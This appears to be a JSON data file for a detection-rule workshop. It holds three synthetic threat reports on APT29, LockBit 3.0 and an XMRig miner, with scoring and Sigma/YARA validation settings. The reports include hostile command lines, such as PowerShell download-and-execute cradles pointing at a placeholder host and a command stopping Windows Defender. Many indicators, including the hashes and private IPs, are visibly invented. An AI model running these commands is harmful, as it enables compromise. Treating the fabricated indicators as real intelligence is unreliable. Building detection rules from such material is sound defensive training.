{
  "workshop_threat_reports": [
    {
      "id": "apt29_cozy_bear",
      "title": "APT29 Cozy Bear Campaign: Advanced Persistent Threat Analysis",
      "difficulty": "hard",
      "expected_rules": 8,
      "content": "# APT29 Cozy Bear Campaign Analysis\n\n## Executive Summary\nAPT29, also known as Cozy Bear, has been conducting sophisticated cyber espionage campaigns targeting government organizations, healthcare systems, and critical infrastructure sectors. This advanced persistent threat group demonstrates exceptional operational security and employs living-off-the-land techniques to maintain persistence while evading detection.\n\n## Campaign Overview\n\n### Initial Access\n- **Spear Phishing:** Targeted emails with malicious attachments\n- **Watering Hole Attacks:** Compromised legitimate websites\n- **Supply Chain Compromise:** Third-party software infiltration\n\n### Execution Techniques\n- **PowerShell Scripts:** Encoded and obfuscated commands\n- **WMI Execution:** Windows Management Instrumentation abuse\n- **Scheduled Tasks:** Persistence through task scheduler\n- **Service Installation:** Creating malicious Windows services\n\n### Persistence Mechanisms\n- **Registry Run Keys:** HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n- **Startup Folders:** %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n- **Scheduled Tasks:** Daily execution of malicious payloads\n- **Service Creation:** Installing backdoor services\n\n### Defense Evasion\n- **Process Injection:** DLL injection into legitimate processes\n- **Parent PID Spoofing:** Masquerading as legitimate applications\n- **Fileless Execution:** Memory-only payload execution\n- **Anti-Analysis:** VM detection and sandbox evasion\n\n### Credential Access\n- **LSASS Memory Dumping:** Using tools like Mimikatz\n- **Credential Harvesting:** Keyloggers and credential stealers\n- **Password Spraying:** Brute force attacks against accounts\n- **Kerberoasting:** Exploiting Kerberos authentication\n\n### Discovery and Lateral Movement\n- **Network Scanning:** Internal network reconnaissance\n- **PsExec Usage:** Remote command execution\n- **WMI Lateral Movement:** Remote WMI queries\n- **RDP Connections:** Remote desktop protocol abuse\n\n## Indicators of Compromise\n\n### Network Indicators\n- **C2 Domains:**\n  - cozybear[.]net\n  - bear-tracking[.]com\n  - winter-operation[.]org\n  - northern-lights[.]info\n\n- **IP Addresses:**\n  - 192.168.1.100\n  - 10.0.0.45\n  - 172.16.254.123\n  - 203.0.113.78\n\n### File Indicators\n- **Malicious Executables:**\n  - winupdate.exe (SHA256: a1b2c3d4e5f6789...)\n  - systemcheck.exe (SHA256: b2c3d4e5f6789a1...)\n  - securityscan.exe (SHA256: c3d4e5f6789a1b2...)\n\n- **DLL Files:**\n  - msvcr100.dll (SHA256: d4e5f6789a1b2c3...)\n  - kernel32.dll (SHA256: e5f6789a1b2c3d4...)\n\n### Process Indicators\n- **Command Line Patterns:**\n  - powershell.exe -enc [base64_encoded_command]\n  - cmd.exe /c \"whoami && net user\"\n  - wmic.exe process call create \"notepad.exe\"\n  - schtasks.exe /create /tn \"SystemUpdate\" /tr \"C:\\temp\\malware.exe\"\n\n### Registry Indicators\n- **Run Keys:**\n  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate\n  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurity\n\n- **Service Keys:**\n  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService\n  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SystemMonitor\n\n### Email Indicators\n- **Sender Addresses:**\n  - noreply@microsoft[.]com\n  - security@windows-update[.]net\n  - admin@system-notification[.]org\n\n## MITRE ATT&CK Techniques\n\n### Initial Access (TA0001)\n- **T1566.001:** Phishing: Spearphishing Attachment\n- **T1189:** Drive-by Compromise\n- **T1195:** Supply Chain Compromise\n\n### Execution (TA0002)\n- **T1059.001:** Command and Scripting Interpreter: PowerShell\n- **T1047:** Windows Management Instrumentation\n- **T1053.005:** Scheduled Task/Job: Scheduled Task\n\n### Persistence (TA0003)\n- **T1547.001:** Boot or Logon Autostart Execution: Registry Run Keys\n- **T1037.005:** Boot or Logon Initialization Scripts: Startup\n- **T1543.003:** Create or Modify System Process: Windows Service\n\n### Privilege Escalation (TA0004)\n- **T1055:** Process Injection\n- **T1134:** Access Token Manipulation\n- **T1548.002:** Abuse Elevation Control Mechanism: Bypass User Account Control\n\n### Defense Evasion (TA0005)\n- **T1055:** Process Injection\n- **T1036.005:** Masquerading: Match Legitimate Name or Location\n- **T1027:** Obfuscated Files or Information\n- **T1497:** Virtualization/Sandbox Evasion\n\n### Credential Access (TA0006)\n- **T1003.001:** OS Credential Dumping: LSASS Memory\n- **T1056.001:** Input Capture: Keylogging\n- **T1110.003:** Brute Force: Password Spraying\n- **T1558.003:** Steal or Forge Kerberos Tickets: Kerberoasting\n\n### Discovery (TA0007)\n- **T1046:** Network Service Scanning\n- **T1083:** File and Directory Discovery\n- **T1016:** System Network Configuration Discovery\n- **T1033:** System Owner/User Discovery\n\n### Lateral Movement (TA0008)\n- **T1021.002:** Remote Services: SMB/Windows Admin Shares\n- **T1021.003:** Remote Services: Distributed Component Object Model\n- **T1047:** Windows Management Instrumentation\n- **T1021.001:** Remote Services: Remote Desktop Protocol\n\n### Collection (TA0009)\n- **T1005:** Data from Local System\n- **T1039:** Data from Network Shared Drive\n- **T1025:** Data from Removable Media\n\n### Command and Control (TA0011)\n- **T1071.001:** Application Layer Protocol: Web Protocols\n- **T1090:** Proxy\n- **T1102:** Web Service\n- **T1573:** Encrypted Channel\n\n### Exfiltration (TA0010)\n- **T1041:** Exfiltration Over C2 Channel\n- **T1048:** Exfiltration Over Alternative Protocol\n- **T1020:** Automated Exfiltration\n\n## Detection Recommendations\n\n### Network Monitoring\n- Monitor for connections to known C2 domains\n- Analyze DNS queries for suspicious patterns\n- Track unusual data exfiltration volumes\n\n### Endpoint Monitoring\n- Monitor PowerShell execution with encoded commands\n- Track process injection attempts\n- Monitor registry modifications for persistence\n- Analyze scheduled task creation\n\n### Log Analysis\n- Windows Event Logs (Security, System, Application)\n- PowerShell logs and script block logging\n- WMI activity logs\n- Network connection logs\n\n## IOCs Summary\n\n### Domains\n- cozybear[.]net\n- bear-tracking[.]com\n- winter-operation[.]org\n- northern-lights[.]info\n\n### IPs\n- 192.168.1.100\n- 10.0.0.45\n- 172.16.254.123\n- 203.0.113.78\n\n### Hashes\n- a1b2c3d4e5f6789abcdef1234567890abcdef1234567890abcdef1234567890ab\n- b2c3d4e5f6789a1bcdef1234567890abcdef1234567890abcdef1234567890abc\n- c3d4e5f6789a1b2cdef1234567890abcdef1234567890abcdef1234567890abcd\n\n### Email Addresses\n- noreply@microsoft[.]com\n- security@windows-update[.]net\n- admin@system-notification[.]org\n\n### Registry Keys\n- HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate\n- HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurity\n- HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService\n\n### Processes\n- powershell.exe -enc\n- wmic.exe process call create\n- schtasks.exe /create\n- cmd.exe /c \"whoami && net user\"",
      "metadata": {
        "category": "APT",
        "severity": "critical",
        "threat_actor": "APT29",
        "target_sectors": ["Government", "Healthcare", "Critical Infrastructure"],
        "attack_vectors": ["Spear Phishing", "Watering Hole", "Supply Chain"],
        "techniques_count": 25,
        "mitre_techniques": [
          "T1566.001", "T1189", "T1195", "T1059.001", "T1047", "T1053.005",
          "T1547.001", "T1037.005", "T1543.003", "T1055", "T1134", "T1548.002",
          "T1036.005", "T1027", "T1497", "T1003.001", "T1056.001", "T1110.003",
          "T1558.003", "T1046", "T1083", "T1016", "T1033", "T1021.002", "T1041"
        ]
      }
    },
    {
      "id": "ransomware_operation",
      "title": "Ransomware-as-a-Service: LockBit 3.0 Campaign Analysis",
      "difficulty": "medium",
      "expected_rules": 6,
      "content": "# LockBit 3.0 Ransomware-as-a-Service Campaign\n\n## Executive Summary\nLockBit 3.0, also known as LockBit Black, represents the latest evolution of the LockBit ransomware family. This ransomware-as-a-service (RaaS) operation has been targeting organizations worldwide with sophisticated double extortion tactics, combining data encryption with data theft and public shaming.\n\n## Campaign Overview\n\n### Initial Access Methods\n- **Phishing Campaigns:** Malicious email attachments and links\n- **RDP Brute Force:** Automated attacks against exposed RDP services\n- **Vulnerability Exploitation:** Targeting unpatched systems\n- **Supply Chain Attacks:** Compromising managed service providers\n\n### Execution Phase\n- **PowerShell Execution:** Downloading and executing payloads\n- **WMI Abuse:** Using Windows Management Instrumentation\n- **Scheduled Tasks:** Automated execution scheduling\n- **Service Installation:** Creating malicious Windows services\n\n### Persistence Mechanisms\n- **Registry Modification:** Adding persistence through run keys\n- **Service Creation:** Installing backdoor services\n- **Scheduled Tasks:** Creating recurring malicious tasks\n- **Startup Folder:** Placing executables in startup directories\n\n### Privilege Escalation\n- **Token Impersonation:** Stealing and using elevated tokens\n- **Process Injection:** Injecting into high-privilege processes\n- **UAC Bypass:** Circumventing User Account Control\n- **Service Account Abuse:** Exploiting service account privileges\n\n### Defense Evasion\n- **Antivirus Disabling:** Stopping security services\n- **Log Clearing:** Removing evidence of compromise\n- **File Hiding:** Using hidden and system file attributes\n- **Process Masquerading:** Renaming malicious processes\n\n### Credential Access\n- **LSASS Dumping:** Extracting credentials from memory\n- **SAM Database Access:** Reading local account hashes\n- **Credential Harvesting:** Collecting stored credentials\n- **Password Spraying:** Brute force attacks\n\n### Discovery and Lateral Movement\n- **Network Scanning:** Identifying target systems\n- **Share Enumeration:** Finding accessible network shares\n- **Domain Controller Discovery:** Locating domain controllers\n- **PsExec Usage:** Remote command execution\n\n### Data Collection and Exfiltration\n- **File System Enumeration:** Identifying valuable data\n- **Data Classification:** Prioritizing sensitive information\n- **Compression:** Preparing data for exfiltration\n- **Exfiltration:** Transferring data to external servers\n\n### Impact Phase\n- **Data Encryption:** Encrypting files with AES-256\n- **Ransom Note Deployment:** Placing ransom instructions\n- **Data Exfiltration:** Stealing sensitive data\n- **Public Shaming:** Threatening data publication\n\n## Technical Details\n\n### Ransomware Payload\n- **File Extension:** .lockbit3\n- **Encryption Algorithm:** AES-256 with RSA-2048 key exchange\n- **Encrypted Files:** Documents, databases, images, videos\n- **Excluded Files:** System files, executables, and certain extensions\n\n### Command and Control\n- **C2 Infrastructure:** Tor-based communication\n- **Payment Portal:** Bitcoin and Monero payment systems\n- **Data Leak Site:** Public shaming platform\n- **Affiliate Portal:** RaaS management interface\n\n## Indicators of Compromise\n\n### Network Indicators\n- **C2 Domains:**\n  - lockbit3[.]onion\n  - ransom-payment[.]tor\n  - data-leak[.]onion\n  - affiliate-portal[.]tor\n\n- **IP Addresses:**\n  - 185.220.101.42\n  - 198.96.155.3\n  - 45.153.240.138\n  - 91.92.240.213\n\n### File Indicators\n- **Ransomware Executables:**\n  - lockbit3.exe (SHA256: f1e2d3c4b5a6978...)\n  - systemupdate.exe (SHA256: e2d3c4b5a6978f1...)\n  - securityscan.exe (SHA256: d3c4b5a6978f1e2...)\n\n- **Encrypted Files:**\n  - *.lockbit3 (encrypted file extension)\n  - README.txt (ransom note)\n  - HOW_TO_DECRYPT_FILES.html (instructions)\n\n### Process Indicators\n- **Command Line Patterns:**\n  - powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]com/payload.ps1')\"\n  - cmd.exe /c \"net stop \"Windows Defender\"\"\n  - wmic.exe process call create \"C:\\temp\\lockbit3.exe\"\n  - schtasks.exe /create /tn \"SystemUpdate\" /tr \"C:\\temp\\malware.exe\" /sc daily\n\n### Registry Indicators\n- **Run Keys:**\n  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate\n  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityScan\n\n- **Service Keys:**\n  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService\n  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SystemMonitor\n\n### Email Indicators\n- **Sender Addresses:**\n  - noreply@microsoft[.]com\n  - security@windows-update[.]net\n  - admin@system-notification[.]org\n  - support@it-services[.]com\n\n## MITRE ATT&CK Techniques\n\n### Initial Access (TA0001)\n- **T1566.001:** Phishing: Spearphishing Attachment\n- **T1110.003:** Brute Force: Password Spraying\n- **T1190:** Exploit Public-Facing Application\n- **T1195:** Supply Chain Compromise\n\n### Execution (TA0002)\n- **T1059.001:** Command and Scripting Interpreter: PowerShell\n- **T1047:** Windows Management Instrumentation\n- **T1053.005:** Scheduled Task/Job: Scheduled Task\n- **T1543.003:** Create or Modify System Process: Windows Service\n\n### Persistence (TA0003)\n- **T1547.001:** Boot or Logon Autostart Execution: Registry Run Keys\n- **T1037.005:** Boot or Logon Initialization Scripts: Startup\n- **T1543.003:** Create or Modify System Process: Windows Service\n- **T1053.005:** Scheduled Task/Job: Scheduled Task\n\n### Privilege Escalation (TA0004)\n- **T1134:** Access Token Manipulation\n- **T1055:** Process Injection\n- **T1548.002:** Abuse Elevation Control Mechanism: Bypass User Account Control\n- **T1078.003:** Valid Accounts: Local Accounts\n\n### Defense Evasion (TA0005)\n- **T1562.001:** Impair Defenses: Disable or Modify Tools\n- **T1070.001:** Indicator Removal: Clear Windows Event Logs\n- **T1036.005:** Masquerading: Match Legitimate Name or Location\n- **T1027:** Obfuscated Files or Information\n\n### Credential Access (TA0006)\n- **T1003.001:** OS Credential Dumping: LSASS Memory\n- **T1003.002:** OS Credential Dumping: Security Account Manager\n- **T1056.001:** Input Capture: Keylogging\n- **T1110.003:** Brute Force: Password Spraying\n\n### Discovery (TA0007)\n- **T1046:** Network Service Scanning\n- **T1083:** File and Directory Discovery\n- **T1016:** System Network Configuration Discovery\n- **T1033:** System Owner/User Discovery\n\n### Lateral Movement (TA0008)\n- **T1021.002:** Remote Services: SMB/Windows Admin Shares\n- **T1047:** Windows Management Instrumentation\n- **T1021.001:** Remote Services: Remote Desktop Protocol\n- **T1021.003:** Remote Services: Distributed Component Object Model\n\n### Collection (TA0009)\n- **T1005:** Data from Local System\n- **T1039:** Data from Network Shared Drive\n- **T1025:** Data from Removable Media\n- **T1074.001:** Data Staged: Local Data Staging\n\n### Command and Control (TA0011)\n- **T1071.001:** Application Layer Protocol: Web Protocols\n- **T1090:** Proxy\n- **T1102:** Web Service\n- **T1573:** Encrypted Channel\n\n### Exfiltration (TA0010)\n- **T1041:** Exfiltration Over C2 Channel\n- **T1048:** Exfiltration Over Alternative Protocol\n- **T1020:** Automated Exfiltration\n- **T1567:** Exfiltration Over Web Service\n\n### Impact (TA0040)\n- **T1486:** Data Encrypted for Impact\n- **T1490:** Inhibit System Recovery\n- **T1485:** Data Destruction\n- **T1565:** Data Manipulation\n\n## Detection Recommendations\n\n### Network Monitoring\n- Monitor for connections to known C2 domains\n- Analyze DNS queries for suspicious patterns\n- Track unusual data exfiltration volumes\n- Monitor for Tor network connections\n\n### Endpoint Monitoring\n- Monitor PowerShell execution with encoded commands\n- Track process injection attempts\n- Monitor registry modifications for persistence\n- Analyze scheduled task creation\n- Monitor for antivirus service disabling\n\n### Log Analysis\n- Windows Event Logs (Security, System, Application)\n- PowerShell logs and script block logging\n- WMI activity logs\n- Network connection logs\n- File system access logs\n\n## IOCs Summary\n\n### Domains\n- lockbit3[.]onion\n- ransom-payment[.]tor\n- data-leak[.]onion\n- affiliate-portal[.]tor\n\n### IPs\n- 185.220.101.42\n- 198.96.155.3\n- 45.153.240.138\n- 91.92.240.213\n\n### Hashes\n- f1e2d3c4b5a6978abcdef1234567890abcdef1234567890abcdef1234567890ab\n- e2d3c4b5a6978f1bcdef1234567890abcdef1234567890abcdef1234567890abc\n- d3c4b5a6978f1e2cdef1234567890abcdef1234567890abcdef1234567890abcd\n\n### Email Addresses\n- noreply@microsoft[.]com\n- security@windows-update[.]net\n- admin@system-notification[.]org\n- support@it-services[.]com\n\n### Registry Keys\n- HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate\n- HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityScan\n- HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService\n\n### Processes\n- powershell.exe -ep bypass -c\n- cmd.exe /c \"net stop\"\n- wmic.exe process call create\n- schtasks.exe /create",
      "metadata": {
        "category": "Ransomware",
        "severity": "critical",
        "threat_actor": "LockBit",
        "target_sectors": ["Healthcare", "Education", "Manufacturing", "Government"],
        "attack_vectors": ["Phishing", "RDP Brute Force", "Vulnerability Exploitation"],
        "techniques_count": 20,
        "mitre_techniques": [
          "T1566.001", "T1110.003", "T1190", "T1195", "T1059.001", "T1047",
          "T1053.005", "T1543.003", "T1547.001", "T1037.005", "T1134", "T1055",
          "T1548.002", "T1078.003", "T1562.001", "T1070.001", "T1036.005", "T1486",
          "T1041", "T1021.002"
        ]
      }
    },
    {
      "id": "crypto_mining_malware",
      "title": "Cryptocurrency Mining Malware: XMRig Campaign Analysis",
      "difficulty": "easy",
      "expected_rules": 4,
      "content": "# XMRig Cryptocurrency Mining Malware Campaign\n\n## Executive Summary\nXMRig is a legitimate open-source cryptocurrency mining software that has been widely abused by threat actors to mine Monero (XMR) cryptocurrency on compromised systems. This campaign involves the unauthorized installation of XMRig miners through various attack vectors, resulting in significant performance degradation and increased electricity costs for victims.\n\n## Campaign Overview\n\n### Initial Access Methods\n- **Phishing Emails:** Malicious attachments containing mining malware\n- **Drive-by Downloads:** Compromised websites serving mining payloads\n- **Vulnerability Exploitation:** Targeting unpatched systems\n- **Malicious Software:** Bundled with legitimate software\n\n### Execution Phase\n- **PowerShell Execution:** Downloading and executing mining payloads\n- **WMI Abuse:** Using Windows Management Instrumentation\n- **Scheduled Tasks:** Automated execution scheduling\n- **Service Installation:** Creating mining services\n\n### Persistence Mechanisms\n- **Registry Modification:** Adding persistence through run keys\n- **Service Creation:** Installing mining services\n- **Scheduled Tasks:** Creating recurring mining tasks\n- **Startup Folder:** Placing miners in startup directories\n\n### Defense Evasion\n- **Process Masquerading:** Renaming mining processes\n- **File Hiding:** Using hidden and system file attributes\n- **Antivirus Evasion:** Packing and obfuscation techniques\n- **Network Evasion:** Using proxy chains and VPNs\n\n### Resource Abuse\n- **CPU Utilization:** High CPU usage for mining operations\n- **Memory Consumption:** Significant RAM usage\n- **Network Traffic:** Communication with mining pools\n- **Power Consumption:** Increased electricity usage\n\n## Technical Details\n\n### Mining Configuration\n- **Algorithm:** RandomX (Monero mining)\n- **Pool:** pool.minexmr.com:4444\n- **Wallet:** 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijXGUESJ\n- **Threads:** All available CPU cores\n- **Donate Level:** 5% (to XMRig developers)\n\n### Communication\n- **Mining Pool Protocol:** Stratum protocol\n- **Ports:** 4444, 8080, 9999\n- **Encryption:** TLS/SSL connections\n- **Authentication:** Wallet address-based\n\n## Indicators of Compromise\n\n### Network Indicators\n- **Mining Pool Domains:**\n  - pool.minexmr.com\n  - pool.supportxmr.com\n  - pool.xmr.pt\n  - xmrpool.eu\n\n- **IP Addresses:**\n  - 185.71.65.92\n  - 185.71.66.88\n  - 185.71.67.88\n  - 185.71.68.88\n\n### File Indicators\n- **Mining Executables:**\n  - xmrig.exe (SHA256: g1h2i3j4k5l6m7n8...)\n  - miner.exe (SHA256: h2i3j4k5l6m7n8g1...)\n  - system32.exe (SHA256: i3j4k5l6m7n8g1h2...)\n\n- **Configuration Files:**\n  - config.json (mining configuration)\n  - pools.txt (mining pool list)\n  - wallet.dat (wallet information)\n\n### Process Indicators\n- **Command Line Patterns:**\n  - xmrig.exe --config=config.json\n  - miner.exe --pool=pool.minexmr.com:4444 --user=48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijXGUESJ\n  - powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]com/miner.ps1')\"\n\n### Registry Indicators\n- **Run Keys:**\n  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate\n  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurity\n\n- **Service Keys:**\n  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService\n  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SystemMonitor\n\n### Email Indicators\n- **Sender Addresses:**\n  - noreply@microsoft[.]com\n  - security@windows-update[.]net\n  - admin@system-notification[.]org\n\n## MITRE ATT&CK Techniques\n\n### Initial Access (TA0001)\n- **T1566.001:** Phishing: Spearphishing Attachment\n- **T1189:** Drive-by Compromise\n- **T1190:** Exploit Public-Facing Application\n- **T1195:** Supply Chain Compromise\n\n### Execution (TA0002)\n- **T1059.001:** Command and Scripting Interpreter: PowerShell\n- **T1047:** Windows Management Instrumentation\n- **T1053.005:** Scheduled Task/Job: Scheduled Task\n- **T1543.003:** Create or Modify System Process: Windows Service\n\n### Persistence (TA0003)\n- **T1547.001:** Boot or Logon Autostart Execution: Registry Run Keys\n- **T1037.005:** Boot or Logon Initialization Scripts: Startup\n- **T1543.003:** Create or Modify System Process: Windows Service\n- **T1053.005:** Scheduled Task/Job: Scheduled Task\n\n### Defense Evasion (TA0005)\n- **T1036.005:** Masquerading: Match Legitimate Name or Location\n- **T1027:** Obfuscated Files or Information\n- **T1562.001:** Impair Defenses: Disable or Modify Tools\n- **T1070.001:** Indicator Removal: Clear Windows Event Logs\n\n### Discovery (TA0007)\n- **T1083:** File and Directory Discovery\n- **T1016:** System Network Configuration Discovery\n- **T1033:** System Owner/User Discovery\n- **T1049:** System Network Connections Discovery\n\n### Command and Control (TA0011)\n- **T1071.001:** Application Layer Protocol: Web Protocols\n- **T1102:** Web Service\n- **T1573:** Encrypted Channel\n- **T1090:** Proxy\n\n### Impact (TA0040)\n- **T1499:** Endpoint Denial of Service\n- **T1498:** Network Denial of Service\n- **T1486:** Data Encrypted for Impact\n\n## Detection Recommendations\n\n### Network Monitoring\n- Monitor for connections to known mining pool domains\n- Analyze DNS queries for mining-related domains\n- Track unusual network traffic patterns\n- Monitor for high-frequency connections to specific ports\n\n### Endpoint Monitoring\n- Monitor for high CPU utilization processes\n- Track process creation for mining executables\n- Monitor registry modifications for persistence\n- Analyze scheduled task creation\n\n### Log Analysis\n- Windows Event Logs (Security, System, Application)\n- PowerShell logs and script block logging\n- WMI activity logs\n- Network connection logs\n- Performance monitoring logs\n\n## IOCs Summary\n\n### Domains\n- pool.minexmr.com\n- pool.supportxmr.com\n- pool.xmr.pt\n- xmrpool.eu\n\n### IPs\n- 185.71.65.92\n- 185.71.66.88\n- 185.71.67.88\n- 185.71.68.88\n\n### Hashes\n- g1h2i3j4k5l6m7n8abcdef1234567890abcdef1234567890abcdef1234567890ab\n- h2i3j4k5l6m7n8g1bcdef1234567890abcdef1234567890abcdef1234567890abc\n- i3j4k5l6m7n8g1h2cdef1234567890abcdef1234567890abcdef1234567890abcd\n\n### Email Addresses\n- noreply@microsoft[.]com\n- security@windows-update[.]net\n- admin@system-notification[.]org\n\n### Registry Keys\n- HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate\n- HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurity\n- HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService\n\n### Processes\n- xmrig.exe\n- miner.exe\n- system32.exe\n- powershell.exe -ep bypass",
      "metadata": {
        "category": "Cryptocurrency Mining",
        "severity": "medium",
        "threat_actor": "Unknown",
        "target_sectors": ["All Sectors"],
        "attack_vectors": ["Phishing", "Drive-by Downloads", "Vulnerability Exploitation"],
        "techniques_count": 15,
        "mitre_techniques": [
          "T1566.001", "T1189", "T1190", "T1195", "T1059.001", "T1047",
          "T1053.005", "T1543.003", "T1547.001", "T1037.005", "T1036.005",
          "T1027", "T1562.001", "T1070.001", "T1499"
        ]
      }
    }
  ],
  "workshop_config": {
    "competition_duration_minutes": 60,
    "max_participants": 512,
    "scoring_weights": {
      "rule_quality": 0.3,
      "rule_count": 0.2,
      "coverage": 0.2,
      "innovation": 0.15,
      "speed": 0.15
    },
    "validation_criteria": {
      "sigma_rules": {
        "required_fields": ["title", "description", "detection", "level"],
        "valid_levels": ["low", "medium", "high", "critical"],
        "syntax_check": true
      },
      "yara_rules": {
        "required_fields": ["rule", "meta"],
        "syntax_check": true
      }
    }
  }
}
